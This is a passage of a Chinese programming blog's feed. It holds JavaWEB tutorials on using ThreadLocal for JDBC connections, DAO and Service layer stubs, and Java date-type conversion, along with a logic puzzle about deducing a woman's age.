class="hljs-keyword">catch</span> (SQLException e) &#123;<br>            e.printStackTrace();<br>        &#125;<span class="hljs-keyword">finally</span> &#123;<br>            closeAll(connection,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>);<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">closeAll</span><span class="hljs-params">(Connection connection, Statement statement, ResultSet resultSet)</span></span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span>(resultSet != <span class="hljs-keyword">null</span>)&#123;<br>                resultSet.close();<br>            &#125;<br>            <span class="hljs-keyword">if</span>(statement != <span class="hljs-keyword">null</span>)&#123;<br>                statement.close();<br>            &#125;<br>            <span class="hljs-keyword">if</span>(connection != <span class="hljs-keyword">null</span>)&#123;<br>                connection.close();<br>                tl.remove(); <span class="hljs-comment">//关闭连接后，移除connection对象</span><br>            &#125;<br>        &#125;<span class="hljs-keyword">catch</span> (SQLException e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>&#125;<br><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JavaWEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaWEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaWEB-（九）ThreadLocal在JDBC中的应用</title>
    <link href="/2021/08/14/JavaWEB/JavaWEB-%EF%BC%88%E4%B9%9D%EF%BC%89ThreadLocal%E5%9C%A8JDBC%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/"/>
    <url>/2021/08/14/JavaWEB/JavaWEB-%EF%BC%88%E4%B9%9D%EF%BC%89ThreadLocal%E5%9C%A8JDBC%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>ThreadLocal翻译成中文应该是：线程局部变量。ThreadLocal是一个线程内部的存储类，可以在指定线程内存储数据，数据存储以后，只有指定线程可以得到存储数据。提供了线程内存储变量的能力，这些变量不同之处在于每一个线程读取的变量是对应的互相独立的。通过get和set方法就可以得到当前线程对应的值。<br>在并发编程的时候，成员变量如果不做任何处理其实是线程不安全的，各个线程都在操作同一个变量，显然是不行的，并且也知道volatile这个关键字也是不能保证线程安全的。那么在有一种情况之下，需要满足这样一个条件：变量是同一个，但是每个线程都使用同一个初始值，也就是使用同一个变量的一个新的副本。这种情况之下ThreadLocal就非常使用，比如说DAO的数据库连接，知道DAO是单例的，那么他的属性Connection就不是一个线程安全的变量。而每个线程都需要使用他，并且各自使用各自的。这种情况，ThreadLocal就比较好的解决了这个问题。<br>当很多线程需要多次使用同一个对象，并且需要该对象具有相同初始化值的时候最适合使用ThreadLocal。</p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>在连接数据库的工具类中需要添加（修改）以下代码即可：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> ThreadLocal&lt;Connection&gt; tl = <span class="hljs-keyword">new</span> ThreadLocal&lt;&gt;();<span class="hljs-comment">//为线程创建了一个共享对象，用来共享的是 Connection</span><br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Connection <span class="hljs-title">getConnection</span><span class="hljs-params">()</span></span>&#123;<br>        Connection connection = tl.get();<span class="hljs-comment">//将开始的null修改为了tl.get() 。将当前线程中绑定的Connection对象，取一个赋值给connection，第一次得到的为空，因为tl中还没有添加。但后面再次用时，就会得到上一次创建存的。</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span>(connection == <span class="hljs-keyword">null</span>)&#123; <span class="hljs-comment">//用来判断是否是首次创建</span><br>            connection = DriverManager.getConnection(pr.getProperty(<span class="hljs-string">&quot;url&quot;</span>),pr.getProperty(<span class="hljs-string">&quot;user&quot;</span>),pr.getProperty(<span class="hljs-string">&quot;password&quot;</span>));<br>            tl.set(connection);<span class="hljs-comment">//将连接存在当前线程中共享</span><br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> connection;<br>    &#125;<br></code></pre></div></td></tr></table></figure><p>完整更新后的连接数据库工具类代码：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.tothefor.Utils;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.sql.*;<br><span class="hljs-keyword">import</span> java.util.Properties;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> DragonOne</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2021/8/14 14:52</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MoreMove</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Properties pr = <span class="hljs-keyword">new</span> Properties();<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> ThreadLocal&lt;Connection&gt; tl = <span class="hljs-keyword">new</span> ThreadLocal&lt;&gt;();<span class="hljs-comment">//为线程创建了一个共享对象，用来共享的是 Connection</span><br><br>    <span class="hljs-keyword">static</span> &#123;<br>        InputStream is = MoreMove.class.getResourceAsStream(<span class="hljs-string">&quot;/db.properties&quot;</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            pr.load(is);<br>            Class.forName(pr.getProperty(<span class="hljs-string">&quot;driver&quot;</span>));<br>        &#125; <span class="hljs-keyword">catch</span> (IOException | ClassNotFoundException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Connection <span class="hljs-title">getConnection</span><span class="hljs-params">()</span></span>&#123;<br>        Connection connection = tl.get();<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span>(connection == <span class="hljs-keyword">null</span>)&#123;<br>            connection = DriverManager.getConnection(pr.getProperty(<span class="hljs-string">&quot;url&quot;</span>),pr.getProperty(<span class="hljs-string">&quot;user&quot;</span>),pr.getProperty(<span class="hljs-string">&quot;password&quot;</span>));<br>            tl.set(connection);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> connection;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">closeAll</span><span class="hljs-params">(Connection connection, Statement statement, ResultSet resultSet)</span></span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span>(resultSet != <span class="hljs-keyword">null</span>)&#123;<br>                resultSet.close();<br>            &#125;<br>            <span class="hljs-keyword">if</span>(statement != <span class="hljs-keyword">null</span>)&#123;<br>                statement.close();<br>            &#125;<br>            <span class="hljs-keyword">if</span>(connection != <span class="hljs-keyword">null</span>)&#123;<br>                connection.close();<br>            &#125;<br>        &#125;<span class="hljs-keyword">catch</span> (SQLException e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>&#125;<br><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JavaWEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaWEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaWEB-（八）Service(业务逻辑层)</title>
    <link href="/2021/08/13/JavaWEB/JavaWEB-%EF%BC%88%E5%85%AB%EF%BC%89Service(%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E5%B1%82)/"/>
    <url>/2021/08/13/JavaWEB/JavaWEB-%EF%BC%88%E5%85%AB%EF%BC%89Service(%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E5%B1%82)/</url>
    
    <content type="html"><![CDATA[<p>Service层叫服务层，被称为服务，粗略的理解就是对一个或多个DAO进行的再次封装，封装成一个服务，所以这里也就不会是一个原子操作了，需要事物控制。引用对应的Dao数据库操作。作用主要为：将业务逻辑层进行封装，对外提供业务服务调用。通过外观模式，屏蔽业务逻辑内部方法。降低业务逻辑层与UI层的依赖，业务逻辑接口或实现的变化不会影像UI层。降低UI层调用的请求次数及数据往返。</p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><h3 id="1-Service接口"><a href="#1-Service接口" class="headerlink" title="1.Service接口"></a>1.Service接口</h3><p>业务功能。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.tothefor.OtherTest.Service;<br><br><span class="hljs-keyword">import</span> com.tothefor.OtherTest.Person;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> DragonOne</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2021/8/13 22:37</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">PersonService</span> </span>&#123;<br>    <span class="hljs-comment">//睡觉</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Sleep</span><span class="hljs-params">(String name)</span></span>;<br>    <span class="hljs-comment">//吃饭</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Eat</span><span class="hljs-params">(Person p)</span></span>;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h3 id="2-ServiceImpl实现类"><a href="#2-ServiceImpl实现类" class="headerlink" title="2.ServiceImpl实现类"></a>2.ServiceImpl实现类</h3><p>具体实现业务功能。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.tothefor.OtherTest.Service.ServiceImpl;<br><br><span class="hljs-keyword">import</span> com.tothefor.OtherTest.Person;<br><span class="hljs-keyword">import</span> com.tothefor.OtherTest.Service.PersonService;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> DragonOne</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2021/8/13 22:40</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PersonServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">PersonService</span> </span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Sleep</span><span class="hljs-params">(String name)</span> </span>&#123;<br>        <br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Eat</span><span class="hljs-params">(Person p)</span> </span>&#123;<br><br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JavaWEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaWEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaWEB-（七）DAO(数据访问层)</title>
    <link href="/2021/08/13/JavaWEB/JavaWEB-%EF%BC%88%E4%B8%83%EF%BC%89DAO(%E6%95%B0%E6%8D%AE%E8%AE%BF%E9%97%AE%E5%B1%82)/"/>
    <url>/2021/08/13/JavaWEB/JavaWEB-%EF%BC%88%E4%B8%83%EF%BC%89DAO(%E6%95%B0%E6%8D%AE%E8%AE%BF%E9%97%AE%E5%B1%82)/</url>
    
    <content type="html"><![CDATA[<p>DAO (DataAccessobjects 数据存取对象)是指位于业务逻辑和持久化数据之间实现对持久化数据的访问。属于一种比较底层，比较基础的操作，具体到对于某个表的增删改查，也就是说某个DAO一定是和数据库的某一张表一一对应的，其中封装了增删改查基本操作，建议DAO只做原子操作，增删改查。DAO 模式提供了访问关系型数据库系统所需操作的接口，将数据访问和业务逻辑分离对上层提供面向对象的数据访问接口。<br>DAO接口： 把对数据库的所有操作定义成抽象方法，可以提供多种实现。<br>DAO 实现类： 针对不同数据库给出DAO接口定义方法的具体实现。</p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><h3 id="1-Dao接口"><a href="#1-Dao接口" class="headerlink" title="1.Dao接口"></a>1.Dao接口</h3><p>定义功能方法。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.tothefor.OtherTest.DAO;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> DragonOne</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2021/8/13 22:12</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">PersonDao</span> </span>&#123;<br>    <span class="hljs-comment">//插入数据</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">insert</span><span class="hljs-params">(Person p)</span></span>;<br>    <span class="hljs-comment">//删除数据</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">delete</span><span class="hljs-params">(String name)</span></span>;<br>    <span class="hljs-comment">//更改数据</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">update</span><span class="hljs-params">(Person p)</span></span>;<br>    <span class="hljs-comment">//查询数据</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Person <span class="hljs-title">query</span><span class="hljs-params">(String name)</span></span>;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h3 id="2-DaoImpl实现类"><a href="#2-DaoImpl实现类" class="headerlink" title="2.DaoImpl实现类"></a>2.DaoImpl实现类</h3><p>根据需求进行实现相应的功能。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.tothefor.OtherTest.DAO.DaoImpl;<br><br><span class="hljs-keyword">import</span> com.tothefor.OtherTest.DAO.Person;<br><span class="hljs-keyword">import</span> com.tothefor.OtherTest.DAO.PersonDao;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> DragonOne</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2021/8/13 22:15</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PersonDaoImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">PersonDao</span> </span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">insert</span><span class="hljs-params">(Person p)</span> </span>&#123; <br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">delete</span><span class="hljs-params">(String name)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">update</span><span class="hljs-params">(Person p)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Person <span class="hljs-title">query</span><span class="hljs-params">(String name)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JavaWEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaWEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>星星之火-女士的年龄</title>
    <link href="/2021/08/13/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB-%E5%A5%B3%E5%A3%AB%E7%9A%84%E5%B9%B4%E9%BE%84/"/>
    <url>/2021/08/13/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB-%E5%A5%B3%E5%A3%AB%E7%9A%84%E5%B9%B4%E9%BE%84/</url>
    
    <content type="html"><![CDATA[<p>积土成山，风雨兴焉；积水成渊，蛟龙生焉；积善成德，而神明自得，圣心备焉。故不积跬步，无以至千里，不积小流无以成江海。齐骥一跃，不能十步，驽马十驾，功不在舍。面对悬崖峭壁，一百年也看不出一条裂缝来，但用斧凿，能进一寸进一寸，能进一尺进一尺，不断积累，飞跃必来，突破随之。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p><img src="https://img-blog.csdnimg.cn/8b1d0af70f8b4e9a86f615698227ee30.jpg"></p><p>A、B两男士好奇问C女士年龄，C女士给出11个可能答案：</p><p>35、36、38</p><p>42、45、46</p><p>51、55、57</p><p>61、62。</p><p>C女士将十位数告诉A，将个位数告诉B。</p><p>A男士说：我不知道C女士年龄，B也不知道。</p><p>B男士说：原本我不知道C女士年龄，但现在知道了！</p><p>A男士说：现在我也知道了！</p><p>请问C女士年龄是多少？</p><h2 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h2><p>61。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>观察数字，不管A拿到哪一个十位数，都有一个以上的可能答案，所以他不知道答案很正常，但A为什么说B也不知道呢？</p><p>如果B拿到个位是8或7，则B马上就能知道答案，而A断定B不知道，说明A手上的一定不是3或5。</p><p>所以只剩下：42、45、46、61、62。</p><p>在听完A的信息后，B说他知道答案了，说明B手中的个位不可能是2，只能是5、6、1，任一个都能知道答案。</p><p>所以只剩下：45、46、61。</p><p>这时，A说他也知道了，说明A手中的十位只能是6，所以答案是61。</p>]]></content>
    
    
    <categories>
      
      <category>星星之火</category>
      
    </categories>
    
    
    <tags>
      
      <tag>面试题</tag>
      
      <tag>思维题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaWEB-（六）Date工具类</title>
    <link href="/2021/08/12/JavaWEB/JavaWEB-%EF%BC%88%E5%85%AD%EF%BC%89Date%E5%B7%A5%E5%85%B7%E7%B1%BB/"/>
    <url>/2021/08/12/JavaWEB/JavaWEB-%EF%BC%88%E5%85%AD%EF%BC%89Date%E5%B7%A5%E5%85%B7%E7%B1%BB/</url>
    
    <content type="html"><![CDATA[<p>用于解决，当数据库存储的数据类型为 java.sql.Date ，而 java 应用层存储日期类型为 java.util.Date 。当用 java 应用程序插入带有日期的数据到数据库时，需要进行转换，将java中的 java.util.Date 转化为   数据库中的 java.sql.Date。</p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul><li><p>java.util.Date：java语言常规应用层面的日期类型，可以通过字符串创建对应的时间对象。但无法直接通过JDBC插入到数据库。</p></li><li><p>java.sql.Date：不可以通过字符串创建对应的时间对象，只能通过毫秒值创建对象（1970年至今的毫秒值），可以直接通过JDBC插入到数据库。因为 java.sql.Date 是 java.util.Date 的子类。</p></li><li><p>SimpleDateFormat：格式化和解析日期的具体类。允许进行格式化（日期 -&gt; 文本）、解析（文本 -&gt; 日期）和规范化。</p></li></ul><h3 id="1-String-转-java-util-Date"><a href="#1-String-转-java-util-Date" class="headerlink" title="1.String 转 java.util.Date"></a>1.String 转 java.util.Date</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-comment">//获取系统当前时间</span><br>        System.out.println(<span class="hljs-string">&quot;系统当前时间为：&quot;</span> + <span class="hljs-keyword">new</span> java.util.Date());<br>        SimpleDateFormat sdf = <span class="hljs-keyword">new</span> SimpleDateFormat(<span class="hljs-string">&quot;yyyy-MM-dd&quot;</span>); <span class="hljs-comment">//指定日期格式</span><br>        String da = <span class="hljs-string">&quot;2000-07-13&quot;</span>;<br>        java.util.Date jud = sdf.parse(da);<br>        System.out.println(<span class="hljs-string">&quot;String -&gt; java.util.Date : &quot;</span> + jud);<br>    &#125;<br><br><span class="hljs-comment">//输出</span><br>系统当前时间为：Thu Aug <span class="hljs-number">12</span> <span class="hljs-number">23</span>:<span class="hljs-number">37</span>:<span class="hljs-number">02</span> CST <span class="hljs-number">2021</span><br>String -&gt; java.util.Date : Thu Jul <span class="hljs-number">13</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> CST <span class="hljs-number">2000</span><br></code></pre></div></td></tr></table></figure><h3 id="2-java-util-Date-转-String"><a href="#2-java-util-Date-转-String" class="headerlink" title="2.java.util.Date 转 String"></a>2.java.util.Date 转 String</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-comment">//获取系统当前时间</span><br>        System.out.println(<span class="hljs-string">&quot;系统当前时间为：&quot;</span> + <span class="hljs-keyword">new</span> java.util.Date());<br>        SimpleDateFormat sdf = <span class="hljs-keyword">new</span> SimpleDateFormat(<span class="hljs-string">&quot;yyyy-MM-dd&quot;</span>); <span class="hljs-comment">//指定日期格式</span><br>        String da = sdf.format(<span class="hljs-keyword">new</span> java.util.Date());<br>        System.out.println(<span class="hljs-string">&quot;java.util.Date -&gt; String : &quot;</span> + da);<br>    &#125;<br><br><span class="hljs-comment">//输出</span><br>系统当前时间为：Thu Aug <span class="hljs-number">12</span> <span class="hljs-number">23</span>:<span class="hljs-number">36</span>:<span class="hljs-number">10</span> CST <span class="hljs-number">2021</span><br>java.util.Date -&gt; String : <span class="hljs-number">2021</span>-08-<span class="hljs-number">12</span><br></code></pre></div></td></tr></table></figure><h3 id="3-java-util-Date-转-java-sql-Date"><a href="#3-java-util-Date-转-java-sql-Date" class="headerlink" title="3.java.util.Date 转 java.sql.Date"></a>3.java.util.Date 转 java.sql.Date</h3><p>java.sql.Date 不支持字符串转换。只支持毫秒值创建。可以通过 java.util.Date 的getTime()拿到指定日期的毫秒值，再转换为 java.sql.Date 。需要注意的是，它的形式与字符串的形式一样，但它不是字符串。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-comment">//获取系统当前时间</span><br>        System.out.println(<span class="hljs-string">&quot;系统当前时间为：&quot;</span> + <span class="hljs-keyword">new</span> java.util.Date());<br>        SimpleDateFormat sdf = <span class="hljs-keyword">new</span> SimpleDateFormat(<span class="hljs-string">&quot;yyyy-MM-dd&quot;</span>); <span class="hljs-comment">//指定日期格式</span><br>        <span class="hljs-comment">//字符串先转为util.Date再转为sql.Date</span><br>        String da = <span class="hljs-string">&quot;2000-07-13&quot;</span>;<br>        java.util.Date jud = sdf.parse(da);<br>        System.out.println(<span class="hljs-string">&quot;String -&gt; java.util.Date : &quot;</span> + jud);<br>        java.sql.Date jsd = <span class="hljs-keyword">new</span> java.sql.Date(jud.getTime());<br>        System.out.println(<span class="hljs-string">&quot;java.util.Date 